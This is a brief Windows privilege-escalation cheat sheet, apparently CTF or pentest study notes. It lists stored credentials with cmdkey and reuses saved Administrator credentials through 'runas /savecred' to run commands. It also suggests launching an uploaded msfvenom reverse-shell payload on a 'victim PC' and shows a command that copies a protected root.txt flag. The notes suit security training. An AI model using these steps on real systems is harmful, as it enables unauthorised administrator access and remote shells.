# RunAs
--------------

runas - to run specific tools, programs or commands with the permissions of a different user

cmdkey - cmd line utility to create, list and delete stored usernames, passwords or creds

```cmd
cmdkey /list   	#identify stored creds
```

to execute a reverse shell using runas; generate a msfvenom payload and upload it to the victim PC

```cmd
runas /savecred /user:WORKGROUP\User "Program to execute"
```


read a flag or something

```cmd
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\Cibbin\Desktop\root.txt"
```